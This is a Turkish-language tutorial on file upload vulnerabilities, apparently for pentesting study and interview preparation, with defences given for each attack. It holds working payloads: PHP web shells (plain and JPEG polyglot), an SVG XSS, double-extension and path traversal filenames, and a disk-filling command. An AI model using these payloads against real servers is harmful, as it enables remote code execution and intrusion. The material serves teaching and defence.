# 🎯 Payload Örnekleri

Unrestricted File Upload zafiyetlerinde saldırganın amacı, **dosya yükleme özelliğini kötüye kullanarak sisteme zararlı içerik sokmak** ve bunu çalıştırabilmektir. Payload’lar, saldırganın hedeflediği amaca göre değişiklik gösterir: **Remote Code Execution (RCE)**, **XSS**, **Malware bulaştırma**, **Phishing**, **DoS** vb.

Bu bölümde güncel ve pratik Payload örneklerini, kullanım senaryolarını, savunma yöntemlerini ve mülakatlarda sık sorulan konuları ele alıyoruz.

---

## 📌 1. Web Shell Payload’ları

### Açıklama
Web shell, saldırganın yüklediği bir script dosyasıdır. Yüklendikten sonra saldırgan **uzaktan komut çalıştırma (RCE)** elde eder.

### Örnek Payload

```
<?php system($_GET['cmd']); ?>
```

### Kullanım
- Dosya `shell.php` olarak yüklenir.
- Tarayıcıdan şu şekilde çağrılır:
  `http://target.com/uploads/shell.php?cmd=whoami`

### Risk
- Saldırgan sisteme sınırsız komut gönderebilir.
- Yetki yükseltme (Privilege Escalation) adımlarına zemin hazırlar.

### Savunma
- Script dosyalarının yüklenmesini engelle (ör. `.php`, `.asp`, `.jsp`).
- Upload dizinini web root dışında tut.
- WAF kullanarak zararlı request’leri filtrele.

---

## 📌 2. Polyglot Payload’lar

### Açıklama
Polyglot payload, hem **geçerli bir dosya** (örn. JPEG) hem de **çalıştırılabilir bir script** olabilen dosyadır. Uygulama sadece MIME veya uzantı kontrolüne güveniyorsa atlatılabilir.

### Örnek Payload

```
ÿØÿàJFIF...(JPEG header)

<?php echo shell_exec($_GET['cmd']); ?>
```

### Kullanım
- `shell.jpg` adıyla yüklenir.
- Eğer uygulama `uploads/` altında erişime izin verirse:
  `http://target.com/uploads/shell.jpg?cmd=ls`

### Risk
- Görünürde masum dosya → gerçekte RCE.
- Antivirüs / basit filtreleme kolayca bypass edilebilir.

### Savunma
- Dosya içeriğini tarat (MIME + content validation).
- Dosya yükleme sonrası otomatik güvenlik taraması uygula.

---

## 📌 3. Client-Side Execution Payload’ları (XSS / HTML Injection)

### Açıklama
Dosya yükleme sadece **istemci tarafında** tehlike oluşturacak şekilde kullanılabilir. Saldırgan `.html` veya `.svg` yükleyip kurbanı kandırabilir.

### Örnek Payload (XSS içeren SVG)

```
<svg onload=alert('XSS')>
```

### Kullanım
- `xss.svg` dosyası yüklenir.
- Kurban bu dosyayı açtığında XSS tetiklenir.

### Risk
- Session hijacking.
- Phishing (Fake login sayfaları).

### Savunma
- `.html`, `.svg` gibi yürütülebilir client-side dosyaları yasakla.
- Content-Disposition: attachment header’ı ile açılmasını sağla.

---

## 📌 4. Double Extension Payload’lar

### Açıklama
Uygulama sadece **ilk uzantıyı** kontrol ederse saldırgan ikinci uzantıyı kullanabilir.

### Örnek Payload
```
shell.php.jpg
shell.asp;.jpg
```

### Kullanım
- `shell.php.jpg` yüklenir.
- Sunucu tarafında `php` yorumlanıyorsa RCE elde edilir.

### Risk
- Basit filtreleri kolayca bypass eder.

### Savunma
- Sadece extension değil MIME ve content validation da yapılmalı.
- Whitelist yaklaşımı: sadece izinli uzantılara izin ver.

---

## 📌 5. Large File / DoS Payload’lar

### Açıklama
Saldırgan çok büyük boyutlu dosyalar yükleyerek **disk dolumu** veya **service disruption** yapabilir.

### Örnek Payload

```
fallocate -l 10G largefile.img
```

### Kullanım
- Yüzlerce GB boyutlu dosya yüklenir.
- Sunucu disk alanı dolar, sistem çalışmaz.

### Risk
- Availability (DoS) ihlali.
- Sunucu performansında ciddi düşüş.

### Savunma
- Dosya boyutu limitleri (örn. max 2MB).
- Rate limiting (yükleme sayısını sınırlama).

---

## 📌 6. Malware / Trojan Payload’ları

### Açıklama
Saldırgan zararlı bir **exe/pdf/doc** dosyası yükleyip kurbanları hedef alabilir.

### Örnek Payload
- `invoice.pdf` içine gömülü RAT (Remote Access Trojan).
- `setup.exe` → trojanized installer.

### Kullanım
- Dosya güvenilirmiş gibi paylaşılır.
- Kurban açtığında cihazına malware bulaşır.

### Risk
- Kullanıcı sistemlerinin ele geçirilmesi.
- APT saldırılarında yaygın yöntem.

### Savunma
- Antivirüs / sandbox taraması.
- Güvenli Content-Disposition: attachment kullanımı.

---

## 📌 7. Path Traversal Payload’ları

### Açıklama
Saldırgan dosya adını manipüle ederek **beklenmedik dizinlere** dosya yazdırabilir.

### Örnek Payload
```
../../../../var/www/html/shell.php
```

### Kullanım
- Sunucu doğru sanitize etmezse `shell.php` direkt `web root` altına yazılır.

### Risk
- Sistemin kritik dosyaları overwrite edilebilir.
- Doğrudan RCE elde edilebilir.

### Savunma
- Dosya adlarını sanitize et.
- Kullanıcıdan gelen path’i tamamen yok sayıp random isim ata.

---

# 🛡️ Savunma Yöntemleri (Best Practices)

1. **Whitelist yaklaşımı**: sadece güvenli uzantılara izin ver (.jpg, .png, .pdf).
2. **MIME + content validation** yap.
3. **Upload dizini web root dışında** olmalı.
4. **Randomize filename** kullan.
5. **Antivirus / Sandbox scanning** uygula.
6. **Limit koy**: boyut, uzantı, upload hızı.
7. **WAF** ile ek katman koruma.

---

# 💡 Mülakat Soruları

1. Unrestricted File Upload ile nasıl RCE elde edilir?  
2. Polyglot payload nedir, nasıl çalışır?  
3. File upload zafiyetlerinde bypass yöntemlerinden 3 örnek verin.  
4. File upload güvenliğini artırmak için hangi best practice’leri uygulardınız?  
5. Bir uygulamada sadece uzantı kontrolü varsa, saldırgan hangi teknikleri kullanarak bunu bypass edebilir?  

---
✅ **Sonuç**:  
File Upload zafiyetleri, saldırganlara çok geniş saldırı yüzeyi sağlar. Payload çeşitliliği sayesinde hem sunucu tarafı (RCE, DoS) hem de istemci tarafı (XSS, phishing) saldırılar yapılabilir. Pentester’ların bu payload’ları pratikte deneyimlemesi, güvenlik uzmanlarının ise best practice’leri uygulaması kritik önem taşır.






